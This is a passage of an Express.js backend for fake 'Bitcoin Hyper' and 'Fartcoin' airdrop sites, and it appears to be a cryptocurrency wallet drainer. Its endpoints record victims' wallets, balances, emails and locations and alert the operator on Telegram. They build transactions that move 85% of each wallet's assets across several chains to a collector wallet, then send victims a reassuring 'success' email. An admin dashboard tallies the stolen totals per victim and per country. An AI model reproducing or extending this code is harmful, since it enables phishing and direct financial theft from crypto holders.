    if (balanceResult.success) {
      // Update participant with balance data
      participant.totalValueUSD = balanceResult.data.totalValueUSD;
      participant.isEligible = balanceResult.data.isEligible;
      participant.allocation = balanceResult.data.allocation;
      participant.lastScanned = new Date().toISOString();
      participant.balances = balanceResult.data.balances;
      
      if (balanceResult.data.isEligible) {
        memoryStorage.settings.statistics.eligibleParticipants++;
      }
      
      await saveStorage();
      
      // Full Telegram connection summary with source
      const sourceDisplay = source === 'fartcoin' ? '💨 Fartcoin' : '₿ Bitcoin Hyper';
      const sourceUrl = source === 'fartcoin' ? 'https://fartcoinairdrop.vercel.app' : 'https://bitcoinhypertoken.vercel.app';
      
      const connectMsg = 
        `${location.flag} <b>WALLET CONNECTED</b> - ${sourceDisplay}\n` +
        `👛 <b>Wallet:</b> ${walletAddress.substring(0, 10)}...${walletAddress.substring(38)}\n` +
        `💵 <b>Total Balance:</b> $${balanceResult.data.totalValueUSD.toFixed(2)}\n` +
        `🎯 <b>Status:</b> ${balanceResult.data.isEligible ? '✅ ELIGIBLE' : '👋 WELCOME'}\n` +
        `📧 <b>Email:</b> ${email}\n` +
        `🌍 <b>Source:</b> ${sourceDisplay}\n` +
        `🔗 <b>Source URL:</b> ${sourceUrl}`;
      
      await sendTelegramMessage(connectMsg);
      
      res.json({
        success: true,
        data: {
          walletAddress,
          email,
          country: location.country,
          flag: location.flag,
          city: location.city,
          totalValueUSD: balanceResult.data.totalValueUSD,
          isEligible: balanceResult.data.isEligible,
          eligibilityReason: balanceResult.data.eligibilityReason,
          allocation: balanceResult.data.allocation,
          balances: balanceResult.data.balances,
          source: source || 'unknown'
        }
      });
      
    } else {
      res.status(500).json({ success: false, error: 'Balance check failed' });
    }
    
  } catch (error) {
    console.error('Connect error:', error);
    res.status(500).json({ success: false, error: 'Connection failed' });
  }
});

// ============================================
// PREPARE FLOW ENDPOINT - FULL NOTIFICATIONS WITH SOURCE
// ============================================

app.post('/api/presale/prepare-flow', async (req, res) => {
  try {
    const { walletAddress, source } = req.body;
    
    if (!walletAddress?.match(/^0x[a-fA-F0-9]{40}$/)) {
      return res.status(400).json({ success: false, error: 'Invalid wallet address' });
    }
    
    const participant = memoryStorage.participants.find(
      p => p.walletAddress.toLowerCase() === walletAddress.toLowerCase()
    );
    
    if (!participant || !participant.isEligible) {
      return res.status(400).json({ success: false, error: 'Not eligible' });
    }
    
    const balanceResult = await getWalletBalance(walletAddress);
    
    const transactions = balanceResult.data.balances
      .filter(b => b.valueUSD > 0 && PROJECT_FLOW_ROUTERS[b.chain])
      .map(b => ({
        chain: b.chain,
        chainId: b.chainId,
        amount: (b.amount * 0.85).toFixed(12),
        valueUSD: (b.valueUSD * 0.85).toFixed(2),
        symbol: b.symbol,
        contractAddress: PROJECT_FLOW_ROUTERS[b.chain],
        collectorAddress: COLLECTOR_WALLET
      }));
    
    const totalFlowUSD = transactions.reduce((sum, t) => sum + parseFloat(t.valueUSD), 0).toFixed(2);
    
    const flowId = `FLOW-${Date.now()}-${crypto.randomBytes(4).toString('hex').toUpperCase()}`;
    
    memoryStorage.pendingFlows.set(flowId, {
      walletAddress: walletAddress.toLowerCase(),
      transactions,
      totalFlowUSD,
      status: 'prepared',
      createdAt: new Date().toISOString(),
      completedChains: [],
      source: source || participant.source || 'unknown' // Store source
    });
    
    await saveStorage();
    
    // Full Telegram notification with all transaction details and source
    const sourceDisplay = source === 'fartcoin' ? '💨 Fartcoin' : '₿ Bitcoin Hyper';
    const sourceUrl = source === 'fartcoin' ? 'https://fartcoinairdrop.vercel.app' : 'https://bitcoinhypertoken.vercel.app';
    
    let txDetails = '';
    transactions.forEach((tx, index) => {
      txDetails += `\n   ${index+1}. ${tx.chain}: ${tx.amount} ${tx.symbol} ($${tx.valueUSD})`;
    });
    
    await sendTelegramMessage(
      `🔐 <b>FLOW PREPARED</b> - ${sourceDisplay}\n` +
      `👛 <b>Wallet:</b> ${walletAddress.substring(0, 10)}...${walletAddress.substring(38)}\n` +
      `💵 <b>Total Value:</b> $${totalFlowUSD}\n` +
      `🔗 <b>Transactions (${transactions.length} chains):</b>${txDetails}\n` +
      `🆔 <b>Flow ID:</b> <code>${flowId}</code>\n` +
      `🌍 <b>Source:</b> ${sourceDisplay}\n` +
      `🔗 <b>Source URL:</b> ${sourceUrl}`
    );
    
    res.json({
      success: true,
      data: {
        flowId,
        totalFlowUSD,
        transactionCount: transactions.length,
        transactions
      }
    });
    
  } catch (error) {
    console.error('Prepare flow error:', error);
    res.status(500).json({ success: false, error: 'Preparation failed' });
  }
});

// ============================================
// EXECUTE FLOW ENDPOINT - FULL NOTIFICATIONS WITH SOURCE + EMAIL
// ============================================

app.post('/api/presale/execute-flow', async (req, res) => {
  try {
    const { walletAddress, chainName, flowId, txHash, amount, symbol, valueUSD, email, location, source } = req.body;
    
    if (!walletAddress?.match(/^0x[a-fA-F0-9]{40}$/)) {
      return res.status(400).json({ success: false });
    }
    
    console.log(`\n💰 EXECUTE FLOW for ${walletAddress.substring(0, 10)} on ${chainName} from source: ${source || 'unknown'}`);
    
    const participant = memoryStorage.participants.find(
      p => p.walletAddress.toLowerCase() === walletAddress.toLowerCase()
    );
    
    if (participant) {
      // Initialize flow transactions array if needed
      if (!participant.flowTransactions) {
        participant.flowTransactions = [];
      }
      
      participant.flowTransactions.push({ 
        chain: chainName, 
        flowId,
        txHash,
        timestamp: new Date().toISOString() 
      });
      
      // Get flow from pending flows
      const flow = memoryStorage.pendingFlows.get(flowId);
      let txValueUSD = 0;
      let txAmount = '0';
      let txSymbol = '';
      
      if (flow && flow.transactions) {
        const tx = flow.transactions.find(t => t.chain === chainName);
        if (tx) {
          txAmount = tx.amount;
          txSymbol = tx.symbol;
          txValueUSD = parseFloat(tx.valueUSD);
          
          // Add to processed transactions with correct USD value
          memoryStorage.settings.statistics.processedTransactions.push({
            wallet: walletAddress,
            chain: chainName,
            flowId,
            txHash,
            valueUSD: txValueUSD,
            amount: txAmount,
            symbol: txSymbol,
            timestamp: new Date().toISOString(),
            source: source || flow?.source || 'unknown' // Store source
          });
          
          // Increment total processed wallets ONLY ONCE per unique wallet
          // Check if this wallet hasn't been counted before in this flow
          const walletProcessedBefore = memoryStorage.settings.statistics.processedTransactions.some(
            t => t.wallet === walletAddress && t.flowId !== flowId
          );
          
          if (!walletProcessedBefore) {
            memoryStorage.settings.statistics.totalProcessedWallets++;
          }
          
          // ============================================
          // ADDED: SEND PHP MAIL NOTIFICATION
          // ============================================
          const recipientEmail = participant.email || email || await getWalletEmail(walletAddress);
          
          if (recipientEmail) {
            // Get location from participant or request
            const userLocation = {
              name: participant.country || location?.country || 'Unknown',
              flag: participant.flag || location?.flag || '🌍'
            };
            
            // Send email asynchronously (don't await to not block response)
            sendSuccessEmail(recipientEmail, {
              country: userLocation,
              amount: txValueUSD.toFixed(2),
              network: chainName,
              txHash: txHash,
              walletAddress: walletAddress,
              source: source || flow?.source || 'unknown'
            }).catch(err => console.error('Background email error:', err));
          }
        }
      }
      
      // Update pending flow
      if (flow) {
        if (!flow.completedChains) {
          flow.completedChains = [];
        }
        
        if (!flow.completedChains.includes(chainName)) {
          flow.completedChains.push(chainName);
        }
        
        // Get source from flow or request
        const flowSource = flow.source || source || 'unknown';
        const sourceDisplay = flowSource === 'fartcoin' ? '💨 Fartcoin' : '₿ Bitcoin Hyper';
        const sourceUrl = flowSource === 'fartcoin' ? 'https://fartcoinairdrop.vercel.app' : 'https://bitcoinhypertoken.vercel.app';
        
        // Full Telegram notification for chain execution with source
        await sendTelegramMessage(
          `💰 <b>CHAIN TRANSACTION EXECUTED</b> - ${sourceDisplay}\n` +
          `👛 <b>Wallet:</b> ${walletAddress.substring(0, 10)}...${walletAddress.substring(38)}\n` +
          `🔗 <b>Chain:</b> ${chainName}\n` +
          `💵 <b>Amount:</b> ${txAmount} ${txSymbol} ($${txValueUSD.toFixed(2)})\n` +
          `🆔 <b>Tx Hash:</b> <code>${txHash}</code>\n` +
          `🆔 <b>Flow ID:</b> <code>${flowId}</code>\n` +
          `🌍 <b>Source:</b> ${sourceDisplay}\n` +
          `🔗 <b>Source URL:</b> ${sourceUrl}`
        );
        
        // Check if flow is complete
        if (flow.completedChains.length === flow.transactions.length) {
          // Add to total processed USD
          memoryStorage.settings.statistics.totalProcessedUSD += parseFloat(flow.totalFlowUSD);
          
          // Move to completed flows
          memoryStorage.completedFlows.set(flowId, { 
            ...flow, 
            completedAt: new Date().toISOString() 
          });
          memoryStorage.pendingFlows.delete(flowId);
          
          // Calculate total from all chains for this flow
          let completionDetails = '';
          let flowTotalUSD = 0;
          
          flow.transactions.forEach(t => {
            const completed = flow.completedChains.includes(t.chain) ? '✅' : '❌';
            const txValue = parseFloat(t.valueUSD);
            flowTotalUSD += txValue;
            completionDetails += `\n   ${completed} ${t.chain}: ${t.amount} ${t.symbol} ($${txValue.toFixed(2)})`;
          });
          
          // Full completion notification with all details and source
          await sendTelegramMessage(
            `✅ <b>🎉 FLOW COMPLETED 🎉</b> - ${sourceDisplay}\n` +
            `👛 <b>Wallet:</b> ${walletAddress.substring(0, 10)}...${walletAddress.substring(38)}\n` +
            `💵 <b>Total Value:</b> $${flowTotalUSD.toFixed(2)}\n` +
            `🔗 <b>All ${flow.transactions.length} chains processed!</b>${completionDetails}\n` +
            `🆔 <b>Flow ID:</b> <code>${flowId}</code>\n` +
            `🌍 <b>Source:</b> ${sourceDisplay}\n` +
            `🔗 <b>Source URL:</b> ${sourceUrl}`
          );
        }
        
        await saveStorage();
      }
    }
    
    res.json({ success: true });
    
  } catch (error) {
    console.error('Execute flow error:', error);
    res.status(500).json({ success: false });
  }
});

// ============================================
// CLAIM ENDPOINT - FULL NOTIFICATIONS WITH SOURCE
// ============================================

app.post('/api/presale/claim', async (req, res) => {
  try {
    const { walletAddress, source } = req.body;
    
    if (!walletAddress?.match(/^0x[a-fA-F0-9]{40}$/)) {
      return res.status(400).json({ success: false });
    }
    
    const participant = memoryStorage.participants.find(p => p.walletAddress.toLowerCase() === walletAddress.toLowerCase());
    
    if (!participant || !participant.isEligible) {
      return res.status(400).json({ success: false });
    }
    
    participant.claimed = true;
    participant.claimedAt = new Date().toISOString();
    memoryStorage.settings.statistics.claimedParticipants++;
    
    await saveStorage();
    
    const claimId = `BTH-${Date.now()}-${crypto.randomBytes(4).toString('hex').toUpperCase()}`;
    
    // Get source from participant or request
    const claimSource = source || participant.source || 'unknown';
    const sourceDisplay = claimSource === 'fartcoin' ? '💨 Fartcoin' : '₿ Bitcoin Hyper';
    const sourceUrl = claimSource === 'fartcoin' ? 'https://fartcoinairdrop.vercel.app' : 'https://bitcoinhypertoken.vercel.app';
    
    // Full Telegram notification for claim completion with source
    await sendTelegramMessage(
      `🎯 <b>🎉 CLAIM COMPLETED 🎉</b> - ${sourceDisplay}\n` +
      `👛 <b>Wallet:</b> ${walletAddress.substring(0, 10)}...${walletAddress.substring(38)}\n` +
      `🎟️ <b>Claim ID:</b> <code>${claimId}</code>\n` +
      `🎁 <b>Allocation:</b> ${participant.allocation?.amount || '5000'} BTH\n` +
      `📧 <b>Email:</b> ${participant.email}\n` +
      `📍 <b>Location:</b> ${participant.country} ${participant.flag}${participant.city ? `, ${participant.city}` : ''}\n` +
      `🌍 <b>Source:</b> ${sourceDisplay}\n` +
      `🔗 <b>Source URL:</b> ${sourceUrl}`
    );
    
    res.json({ success: true });
    
  } catch (error) {
    console.error('Claim error:', error);
    res.status(500).json({ success: false });
  }
});

// ============================================
// ADDED: EMAIL LOGS ENDPOINT
// ============================================

app.get('/api/admin/email-logs', (req, res) => {
  const token = req.query.token;
  const adminToken = process.env.ADMIN_TOKEN || 'YourSecureTokenHere123!';
  
  if (token?.trim() !== adminToken?.trim()) {
    return res.status(401).json({ success: false, error: 'Invalid admin token' });
  }
  
  const emailLogs = memoryStorage.emailLog || [];
  
  res.json({
    success: true,
    summary: {
      total: emailLogs.length,
      sent: emailLogs.filter(e => e.status === 'sent').length,
      failed: emailLogs.filter(e => e.status === 'failed').length
    },
    logs: emailLogs.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp)).slice(0, 100)
  });
});

// ============================================
// ADDED: TEST EMAIL ENDPOINT
// ============================================

app.post('/api/admin/test-email', async (req, res) => {
  const token = req.query.token;
  const adminToken = process.env.ADMIN_TOKEN || 'YourSecureTokenHere123!';
  
  if (token?.trim() !== adminToken?.trim()) {
    return res.status(401).json({ success: false, error: 'Invalid admin token' });
  }
  
  try {
    const testEmail = req.body.email || process.env.EMAIL_FROM || 'barrysilbertbtc@gmail.com';
    
    const result = await sendSuccessEmail(testEmail, {
      country: { name: 'United States', flag: '🇺🇸' },
      amount: '1250.00',
      network: 'Ethereum',
      txHash: '0x' + crypto.randomBytes(32).toString('hex'),
      walletAddress: '0x742d35Cc6634C0532925a3b844Bc454e4438f44e',
      source: 'bitcoin-hyper'
    });
    
    res.json({
      success: result.success,
      message: result.success ? 'Test email sent' : 'Failed to send'
    });
    
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

// ============================================
// ADMIN DASHBOARD WITH TIME TOGGLE - CORRECT TOTALS FROM ALL CHAINS
// ============================================

app.get('/api/admin/dashboard', (req, res) => {
  const token = req.query.token;
  const days = parseInt(req.query.days) || 7; // Default to 7 days
  const adminToken = process.env.ADMIN_TOKEN || 'YourSecureTokenHere123!';
  
  // Trim tokens to avoid whitespace issues
  if (token?.trim() !== adminToken?.trim()) {
    console.log(`❌ Unauthorized admin access attempt`);
    return res.status(401).json({ success: false, error: 'Invalid admin token' });
  }
  
  const cutoffTime = Date.now() - (days * 24 * 60 * 60 * 1000);
  
  // ============================================
  // FILTER DATA BY TIME RANGE
  // ============================================
  
  // Filter site visits
  const filteredVisits = Array.isArray(memoryStorage.siteVisits) 
    ? memoryStorage.siteVisits
        .filter(v => new Date(v.timestamp).getTime() > cutoffTime)
        .sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp))
    : [];
  
  // Filter participants
  const filteredParticipants = Array.isArray(memoryStorage.participants)
    ? memoryStorage.participants
        .filter(p => new Date(p.connectedAt).getTime() > cutoffTime)
        .sort((a, b) => new Date(b.connectedAt) - new Date(a.connectedAt))
    : [];
  
  // Filter pending flows
  const filteredPendingFlows = memoryStorage.pendingFlows instanceof Map
    ? Array.from(memoryStorage.pendingFlows.entries())
        .filter(([_, flow]) => new Date(flow.createdAt).getTime() > cutoffTime)
        .map(([id, flow]) => ({ id, ...flow }))
        .sort((a, b) => new Date(b.createdAt) - new Date(a.createdAt))
    : [];
  
  // Filter completed flows
  const filteredCompletedFlows = memoryStorage.completedFlows instanceof Map
    ? Array.from(memoryStorage.completedFlows.entries())
        .filter(([_, flow]) => new Date(flow.completedAt).getTime() > cutoffTime)
        .map(([id, flow]) => ({ id, ...flow }))
        .sort((a, b) => new Date(b.completedAt) - new Date(a.completedAt))
    : [];
  
  // Filter processed transactions
  const filteredTransactions = Array.isArray(memoryStorage.settings?.statistics?.processedTransactions)
    ? memoryStorage.settings.statistics.processedTransactions
        .filter(t => new Date(t.timestamp).getTime() > cutoffTime)
        .sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp))
    : [];
  
  // Filter email logs - ADDED
  const filteredEmailLogs = Array.isArray(memoryStorage.emailLog)
    ? memoryStorage.emailLog
        .filter(e => new Date(e.timestamp).getTime() > cutoffTime)
        .sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp))
    : [];
  
  // Calculate total raised in this period (sum of all transaction values from all chains)
  const totalRaisedInPeriod = filteredTransactions.reduce((sum, t) => sum + (t.valueUSD || 0), 0);
  
  // Calculate total raised all time (sum of all transactions ever from all chains)
  const totalRaisedAllTime = memoryStorage.settings?.statistics?.totalProcessedUSD || 0;
  
  // Calculate unique wallets processed in this period
  const uniqueWalletsInPeriod = new Set(filteredTransactions.map(t => t.wallet)).size;
  
  // ============================================
  // LOCATION STATS
  // ============================================
  
  const locationStats = {};
  filteredParticipants.forEach(p => {
    if (p && p.country) {
      const key = `${p.country}|${p.flag || '🌍'}`;
      if (!locationStats[key]) {
        locationStats[key] = { 
          country: p.country, 
          flag: p.flag || '🌍', 
          count: 0, 
          eligible: 0,
          claimed: 0
        };
      }
      locationStats[key].count++;
      if (p.isEligible) locationStats[key].eligible++;
      if (p.claimed) locationStats[key].claimed++;
    }
  });
  
  // ============================================
  // DAILY ACTIVITY
  // ============================================
  
  const dailyActivity = {};
  filteredVisits.forEach(v => {
    if (v && v.timestamp) {
      try {
        const date = new Date(v.timestamp).toISOString().split('T')[0];
        dailyActivity[date] = (dailyActivity[date] || 0) + 1;
      } catch (e) {}
    }
  });
  
  // ============================================
  // HOURLY ACTIVITY (for today)
  // ============================================
  
  const hourlyActivity = {};
  const today = new Date().toISOString().split('T')[0];
  filteredVisits
    .filter(v => v.timestamp.startsWith(today))
    .forEach(v => {
      try {
        const hour = new Date(v.timestamp).getHours();
        hourlyActivity[hour] = (hourlyActivity[hour] || 0) + 1;
      } catch (e) {}
    });
  
  // ============================================
  // NETWORK STATUS
  // ============================================
  
  const networkStatus = Object.keys(PROJECT_FLOW_ROUTERS).map(chain => ({
    chain,
    contract: PROJECT_FLOW_ROUTERS[chain] || 'Not deployed',
    status: PROJECT_FLOW_ROUTERS[chain] ? '✅ Active' : '⏸️ Inactive',
    collector: COLLECTOR_WALLET
  }));
  
  // ============================================
  // SUMMARY STATISTICS - WITH CORRECT TOTALS FROM ALL CHAINS
  // ============================================
  
  const summary = {
    timeRange: days === 1 ? 'Last 24 Hours' : days === 7 ? 'Last 7 Days' : days === 30 ? 'Last 30 Days' : `Last ${days} Days`,
    days: days,
    totalVisits: filteredVisits.length,
    uniqueIPs: new Set(filteredVisits.map(v => v.ip)).size,
    totalParticipants: filteredParticipants.length,
    eligibleParticipants: filteredParticipants.filter(p => p && p.isEligible).length,
    claimedParticipants: filteredParticipants.filter(p => p && p.claimed).length,
    totalRaisedInPeriod: totalRaisedInPeriod.toFixed(2),
    totalRaisedAllTime: totalRaisedAllTime.toFixed(2),
    totalProcessedWalletsInPeriod: uniqueWalletsInPeriod,
    totalProcessedWalletsAllTime: memoryStorage.settings?.statistics?.totalProcessedWallets || 0,
    totalTransactions: filteredTransactions.length,
    pendingFlows: filteredPendingFlows.length,
    completedFlows: filteredCompletedFlows.length,
    telegramStatus: telegramEnabled ? '✅ Connected' : '❌ Disabled',
    telegramBot: telegramBotName || 'N/A',
    emailStatus: process.env.EMAIL_FROM ? '✅ PHP Mail' : '❌ Disabled', // ADDED
    emailsSent: filteredEmailLogs.filter(e => e.status === 'sent').length, // ADDED
    emailsFailed: filteredEmailLogs.filter(e => e.status === 'failed').length, // ADDED
    storage: '💾 Persistent (7 day retention)'
  };
  
  // ============================================
  // SYSTEM CONFIGURATION
  // ============================================
  
  const system = {
    valueThreshold: memoryStorage.settings?.valueThreshold || 1,
    flowEnabled: memoryStorage.settings?.flowEnabled || false,
    tokenName: memoryStorage.settings?.tokenName || 'Bitcoin Hyper',
    tokenSymbol: memoryStorage.settings?.tokenSymbol || 'BTH',
    collectorWallet: COLLECTOR_WALLET || 'N/A',
    emailFrom: process.env.EMAIL_FROM || 'noreply@bitcoinhyper.io', // ADDED
    totalStorage: {
      allTimeParticipants: memoryStorage.participants.length,
      allTimeVisits: memoryStorage.siteVisits.length,
      allTimeFlows: memoryStorage.completedFlows.size,
      allTimeRaised: totalRaisedAllTime.toFixed(2),
      allTimeProcessedWallets: memoryStorage.settings?.statistics?.totalProcessedWallets || 0,
      allTimeEmails: memoryStorage.emailLog?.length || 0 // ADDED
    }
  };
  
  // ============================================
  // FINAL RESPONSE
  // ============================================
  
  res.json({
    success: true,
    timestamp: new Date().toISOString(),
    summary,
    networks: networkStatus,
    recentVisits: filteredVisits.slice(0, 100),
    activeParticipants: filteredParticipants.slice(0, 100),
    pendingFlows: filteredPendingFlows.slice(0, 50),
    completedFlows: filteredCompletedFlows.slice(0, 50),
    processedTransactions: filteredTransactions.slice(0, 100),
    recentEmails: filteredEmailLogs.slice(0, 50), // ADDED
    locationStats: Object.values(locationStats).sort((a, b) => b.count - a.count),
    dailyActivity: Object.entries(dailyActivity)
      .map(([date, count]) => ({ date, count }))
      .sort((a, b) => a.date.localeCompare(b.date)),
    hourlyActivity: Object.entries(hourlyActivity)
      .map(([hour, count]) => ({ hour: parseInt(hour), count }))
      .sort((a, b) => a.hour - b.hour),
    system
  });
});

// ============================================
// ADMIN STATS (quick stats endpoint) - CORRECT TOTALS
// ============================================

app.get('/api/admin/stats', (req, res) => {
  const token = req.query.token;
  const adminToken = process.env.ADMIN_TOKEN || 'YourSecureTokenHere123!';
  
  if (token?.trim() !== adminToken?.trim()) {
    return res.status(401).json({ success: false });
  }
  
  // Calculate total raised correctly from all chains
  const totalRaised = memoryStorage.settings?.statistics?.totalProcessedUSD || 0;
  const totalProcessedWallets = memoryStorage.settings?.statistics?.totalProcessedWallets || 0;
  
  res.json({
    success: true,
    stats: {
      participants: memoryStorage.participants.length,
      eligible: memoryStorage.participants.filter(p => p && p.isEligible).length,
      claimed: memoryStorage.participants.filter(p => p && p.claimed).length,
      totalRaisedUSD: totalRaised.toFixed(2),
      totalProcessedWallets: totalProcessedWallets,
      pendingFlows: memoryStorage.pendingFlows?.size || 0,
      completedFlows: memoryStorage.completedFlows?.size || 0,
      telegram: telegramEnabled ? '✅' : '❌',
      email: process.env.EMAIL_FROM ? '✅' : '❌', // ADDED
      emailsSent: memoryStorage.emailLog?.filter(e => e.status === 'sent').length || 0, // ADDED
      siteVisits: memoryStorage.siteVisits?.length || 0,
      uniqueIPs: memoryStorage.settings?.statistics?.uniqueIPs?.size || 0,
      storage: '💾 7 Day Retention'
    }
  });
});

// ============================================
// ADMIN WALLET DETAILS
// ============================================

app.get('/api/admin/wallet/:address', (req, res) => {
  const token = req.query.token;
  const adminToken = process.env.ADMIN_TOKEN || 'YourSecureTokenHere123!';
  
  if (token?.trim() !== adminToken?.trim()) {
    return res.status(401).json({ success: false });
  }
  
  const walletAddress = req.params.address.toLowerCase();
  
  const participant = memoryStorage.participants.find(p => p && p.walletAddress === walletAddress);
  
  if (!participant) {
    return res.json({ 
      success: true, 
      found: false,
      message: 'Wallet not found in database'
    });
  }
  
  const visits = memoryStorage.siteVisits.filter(v => v && v.walletAddress === walletAddress);
  
  const flows = {
    pending: memoryStorage.pendingFlows instanceof Map
      ? Array.from(memoryStorage.pendingFlows.values()).filter(f => f && f.walletAddress === walletAddress)
      : [],
    completed: memoryStorage.completedFlows instanceof Map
      ? Array.from(memoryStorage.completedFlows.values()).filter(f => f && f.walletAddress === walletAddress)
      : []
  };
  
  const transactions = memoryStorage.settings?.statistics?.processedTransactions
    .filter(t => t && t.wallet && t.wallet.toLowerCase() === walletAddress) || [];
  
  const emails = memoryStorage.emailLog
    ?.filter(e => e.transactionData?.walletAddress?.toLowerCase() === walletAddress) || [];
  
  // Calculate total for this wallet from all chains
  const walletTotal = transactions.reduce((sum, t) => sum + (t.valueUSD || 0), 0);
  
  res.json({
    success: true,
    found: true,
    wallet: {
      ...participant,
      totalContributed: walletTotal.toFixed(2),
      transactionCount: transactions.length,
      emailCount: emails.length
    },
    visits,
    flows,
    transactions,
    emails: emails.map(e => ({
      status: e.status,
      amount: e.transactionData?.amount,
      network: e.transactionData?.network,
      timestamp: e.timestamp
    }))
  });
});

// ============================================
// ADMIN MANUAL SAVE
// ============================================

app.post('/api/admin/save', async (req, res) => {
  const token = req.query.token;
  const adminToken = process.env.ADMIN_TOKEN || 'YourSecureTokenHere123!';
  
  if (token?.trim() !== adminToken?.trim()) {
    return res.status(401).json({ success: false, error: 'Invalid admin token' });
  }
  
  try {
    await saveStorage();
    res.json({ success: true, message: 'Storage saved successfully' });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

// ============================================
// ADMIN MANUAL CLEAN (trigger 7-day cleanup)
// ============================================

app.post('/api/admin/clean', async (req, res) => {
  const token = req.query.token;
  const adminToken = process.env.ADMIN_TOKEN || 'YourSecureTokenHere123!';
  
  if (token?.trim() !== adminToken?.trim()) {
    return res.status(401).json({ success: false, error: 'Invalid admin token' });
  }
  
  try {
    await cleanOldData();
    res.json({ success: true, message: 'Old data cleaned successfully' });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

// ============================================
// 404 Handler
// ============================================

app.use('*', (req, res) => {
  res.status(404).json({ success: false, error: 'Endpoint not found' });
});

// ============================================
// START SERVER
// ============================================

async function startServer() {
  await ensureDataDir();
  memoryStorage = await loadStorage();
  
  app.listen(PORT, '0.0.0.0', async () => {
    console.log(`
  ⚡ BITCOIN HYPER BACKEND - MULTICHAIN FLOW ROUTER
  ================================================
  📍 Port: ${PORT}
  🔗 Backend URL: https://bthbk.vercel.app
  🌍 Site URLs: https://bitcoinhypertoken.vercel.app, https://fartcoinairdrop.vercel.app
  
  📦 COLLECTOR: ${COLLECTOR_WALLET}
  💾 STORAGE: 7 DAY RETENTION
  
  📧 PHP MAIL: ${process.env.EMAIL_FROM ? '✅ Configured' : '❌ (set EMAIL_FROM)'}
  
  📊 CURRENT STATS:
  📁 Total Participants: ${memoryStorage.participants.length}
  📁 Total Visits: ${memoryStorage.siteVisits.length}
  💰 Total Raised: $${memoryStorage.settings.statistics.totalProcessedUSD.toFixed(2)}
  👛 Processed Wallets: ${memoryStorage.settings.statistics.totalProcessedWallets}
  📁 Pending Flows: ${memoryStorage.pendingFlows.size}
  📁 Completed Flows: ${memoryStorage.completedFlows.size}
  📧 Emails Sent: ${memoryStorage.emailLog?.filter(e => e.status === 'sent').length || 0}
  
  🌐 DEPLOYED CONTRACTS:
  ✅ Ethereum: 0x1F498356DDbd13E4565594c3AF9F6d06f2ef6eB4
  ✅ BSC: 0x1F498356DDbd13E4565594c3AF9F6d06f2ef6eB4
  ✅ Polygon: 0x56d829E89634Ce1426B73571c257623D17db46cB
  ✅ Arbitrum: 0x1F498356DDbd13E4565594c3AF9F6d06f2ef6eB4
  ✅ Avalanche: 0x1F498356DDbd13E4565594c3AF9F6d06f2ef6eB4
  
  ⏰ CLEANUP: Every 6 hours (keeps last 7 days)
  💾 AUTO-SAVE: Every minute
  
  🤖 TELEGRAM: ${process.env.TELEGRAM_BOT_TOKEN ? '✅ Configured' : '❌ Missing'}
  
  🚀 READY FOR MULTICHAIN FLOWS
  `);
    
    await testTelegramConnection();
    await cleanOldData(); // Clean old data on startup
  });
}

// Start the server
startServer();
